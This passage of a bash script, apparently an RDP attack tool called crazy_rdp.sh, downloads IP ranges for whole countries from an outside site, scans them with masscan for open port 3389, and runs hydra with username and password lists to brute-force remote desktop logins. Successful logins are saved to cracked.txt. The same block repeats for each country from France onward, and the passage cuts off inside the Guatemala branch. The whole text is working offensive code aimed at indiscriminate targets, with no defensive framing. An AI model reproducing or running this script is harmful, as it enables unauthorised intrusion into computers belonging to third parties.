curl http://ipdiapazon.16mb.com/France.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "64" ]; then
curl http://ipdiapazon.16mb.com/French_guiana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "65" ]; then
curl http://ipdiapazon.16mb.com/French_polynesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "66" ]; then
curl http://ipdiapazon.16mb.com/Gabon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "67" ]; then
curl http://ipdiapazon.16mb.com/Gambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "68" ]; then
curl http://ipdiapazon.16mb.com/Georgia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "69" ]; then
curl http://ipdiapazon.16mb.com/Germany.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "70" ]; then
curl http://ipdiapazon.16mb.com/Ghana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "71" ]; then
curl http://ipdiapazon.16mb.com/Gibraltar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "72" ]; then
curl http://ipdiapazon.16mb.com/Greece.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "73" ]; then
curl http://ipdiapazon.16mb.com/Greenland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "74" ]; then
curl http://ipdiapazon.16mb.com/Grenada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "75" ]; then
curl http://ipdiapazon.16mb.com/Guam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "76" ]; then
curl http://ipdiapazon.16mb.com/Guatemala.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
